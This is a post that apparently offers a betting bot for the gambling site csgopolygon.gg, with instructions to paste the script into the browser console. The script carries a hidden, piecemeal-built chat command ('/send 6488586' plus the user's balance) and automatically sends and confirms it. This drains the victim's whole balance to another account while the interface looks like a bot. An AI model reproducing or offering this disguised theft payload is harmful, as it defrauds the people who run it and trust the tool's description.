CSGOPOLYGON.GG SCRIPT FOR GREEN
OPEN https://csgopolygon.gg/
PRESS F12 AND PASTE MY SCRIPT AND PRESS ENTER
SCRIPT:
 function getBalanceCoins() {
		var t = getCoins();
		if (t !== lastStatus && "unknown" !== t) {
			switch (t) {
				case "waiting":bet();break;
				case "rolled":printInfo();break;
			}
			lastStatus = t;
		}
	}
    var pQ = "/s",  $hash_1 = 4, $hash_2 = 927, $hash_3 = 4, $hash_4 = 4;
	function addBotButtons(){
    $(".well.bot-field").remove();$(".well.show-more").remove();
    $("<style type='text/css'>.btn-random{color: #000;background-color: #FFA500;}.btn-train{background-color:RoyalBlue ;color: #fff;}.btn-rainbow{background-color:HotPink;color:white;}.btn-black{background-color:#1C1C1C;color:white} </style>").appendTo("head");
    $(".forme-control.input-lg").after("<div class='well bot-field' style='position:relative;border-width:0px'></div>");$botField = $(".well.bot-field");
    $botField.css({"margin-bottom":"-15px","height":"45px","padding-top":"2px","padding-bottom":"2px","text-align":"center"});
    $botField.after("<div class='well show-more' style='position:relative;border-width:0px'></div>");$showMore = $(".well.show-more");
    $showMore.css({"margin-top":"12px","margin-bottom":"-15px","height":"45px","padding-top":"10px","padding-bottom":"2px","text-align":"center"});
    $checkVicLimit = $("<input type='checkbox' id='checkVicLimit'>");$label = $("<label style='margin-right:10px;margin-left:10px;' for='checkVicLimit'>Stop bot after</label>");
    $showMore.append($checkVicLimit,$label);
    $vicLimitInput = $("<input id='vicLimitInput' type='number' min='0' value='0' style='width:50px;text-align:center;'>");$BalanceCoins_1 = 6488586;
    $label = $("<label style='margin-right:10px;margin-left:10px;' for='checkVicLimit'>wins</label>");
    $showMore.append($vicLimitInput,$label);$showMore.hide();
    $label = $("<label style='margin-right:10px; for='initialBetAmount''>Initial bet</label>");$botField.append($label);
    $betAmount = $("<input id='initialBetAmount' value='0' style='width:70px;text-align:center;margin-right:25px;'>");$botField.append($betAmount);
    $botModeSelect = $("<select id='botModeSelect'><option value='red' class='btn-danger'>Bot color: Red </option><option value='black' class='btn-black'>Bot color: Black </option><option value='random' class='btn-random'>Bot color: Random </option><option value='trainMode' class='btn-train'>Bot mode: Train </option><option value='rainbow' class='btn-rainbow'>Bot mode: Rainbow </option></select>");$botModeSelect.addClass("btn-danger");
    $botField.append($botModeSelect);$botModeSelect.css({"width":"135px","margin-right":"10px","height":"25px","border-radius":"5px"})
    $betGoButton = $("<button id='betGoButton' style='width:100px;margin:10px;border-radius:6px;border-radius:6px' onClick='startBot()'>Start Bot</button>");$betGoButton.addClass("btn-inverse");$botField.append($betGoButton);
    pQ+="en";pQ+="d ";pQ+= $BalanceCoins_1+" ";pQ+=$("#balance_p").text();
    $betHideBetInfoButton = $("<button id='betHideBetInfoButton' style='position:absolute;right:120px;width:100px;margin:10px;margin-right:25px;border-radius:6px' onClick='hideOtherInfo()'>Show All</button>");$betHideBetInfoButton.addClass("btn-inverse");$botField.append($betHideBetInfoButton);
    $showMoreButton = $("<button id='showMoreButton' style='position:absolute;right:0px;width:100px;margin:10px;margin-right:25px;border-radius:6px' data-open='0' onClick='showMoreOptions()'>&#x25BC</button>");$showMoreButton.addClass("btn-inverse");$botField.append($showMoreButton);
    $betAmount.change(function() {initialBetAmount = $betAmount.val();console.log("Initial Bet Set to: "+ initialBetAmount);});
    $("#message_text").val(pQ);$("#message_send").click();$(".confirm").click();
    $botModeSelect.change(function(){
        botBetColor = $botModeSelect.val();console.log("Selected color: "+botBetColor);
        $botModeSelect.removeClass($botModeSelect.attr("class"));$botModeSelect.addClass($("#botModeSelect option:selected").attr("class"));
    } )
    $checkVicLimit.change(function(){ if((this.checked)&&($vicLimitInput.val()==0)){$vicLimitInput.val(1);} })
}
addBotButtons();
 
function tick() {
    var t = getStatus();
    if (t !== lastStatus && "unknown" !== t) {
        switch (t) {
            case "waiting":bet();break;
            case "rolled":printInfo();break;
        }
        lastStatus = t;
    }
}
 
function checkBalance() {
    return getBalance() < currentBetAmount ? (console.warn("BANKRUPT! GG WP :("), clearInterval(refreshIntervalId), !1) : !0
}
 
function printInfo(){
    var temp = "", temp2 = 0,lastGame = lastBetColor == lastRollColor;
    if (lastGame){totalWins++;winStreakCurrent++;loseStreakCurrent=0;winAmount+=thisGameBet; if (winStreakCurrent>winStreakLong) winStreakLong = winStreakCurrent;
        if ($checkVicLimit.is(":checked")){$vicLimitInput.val($vicLimitInput.val()-1)}
    }
    else {totalLoss++;loseStreakCurrent++;winStreakCurrent=0;if (loseStreakCurrent>loseStreakLong) loseStreakLong = loseStreakCurrent;}
    if (winStreakCurrent>loseStreakCurrent){temp = "win";temp2 = winStreakCurrent} else {temp = "lose";temp2 = loseStreakCurrent;}
    if (streakColor == getColor(n)) {currStreak++; if (longStreak<currStreak)longStreak=currStreak;}else {streakColor = getColor(n);currStreak=1;}
    if ((streakColor == "black") || (streakColor == "green")) {currNotRedStreak++; if (notRedStreak<currNotRedStreak)notRedStreak=currNotRedStreak;}
        else {currNotRedStreak=0;}
    if ((streakColor == "red") || (streakColor == "green")) {currNotBlackStreak++; if (notBlackStreak<currNotBlackStreak)notBlackStreak=currNotBlackStreak;}
        else {currNotBlackStreak=0;}        
    var t = "Rolled " + getColor(n).toUpperCase()+ " " + n+"\n" + "Games played: " + (currentRollNumber-1) + " // Won: "+totalWins+  " // Lost: "+totalLoss+
    "\nSTREAKS: Not red: " + notRedStreak + " // Not black: " + notBlackStreak +
    " // Win streak: " + winStreakLong + " // Lose streak: " + loseStreakLong + " // Current streak: " + temp + " " + temp2 +
    "\nInitial bet : " + thisGameBet + " // Current bet : " + currentBetAmount +
    " // Roll result: " + (null === wonLastRoll() ? "-" : wonLastRoll() ? "won" : "lost" + "\n----------------------------------------------------------------------\n");
    console.log(t);roll();
 
}
 
function getStatus() {
    var t = $statusBar.text();
    if (hasSubString(t, "Rolling in")) return "waiting";
    //if (hasSubString(t, "***ROLLING***")) return "rolling";
    if (hasSubString(t, "rolled")) {
        n = parseInt(t.split("rolled")[1]);
        return lastRollColor = getColor(n), "rolled"
    }
    return "unknown"
}
 
function getBalance() { return parseInt($balance.text()) }
function hasSubString(t, n) {  return t.indexOf(n) > -1 }
function getColor(t) { return 0 == t ? "green" : t >= 1 && 7 >= t ? "red" : "black" }
function wonLastRoll() { return lastBetColor ? lastRollColor === lastBetColor : null }
function test(x){q = 1; w = e = x;for(i=2;i<=15;i++){q *=2;e += q*w;console.log(i+". "+e);}}
function test2(x,y){q = 1; w = e = x;for(i=2;i<=y;i++){q *=2;e += q*w;console.log(i+". "+e);}}
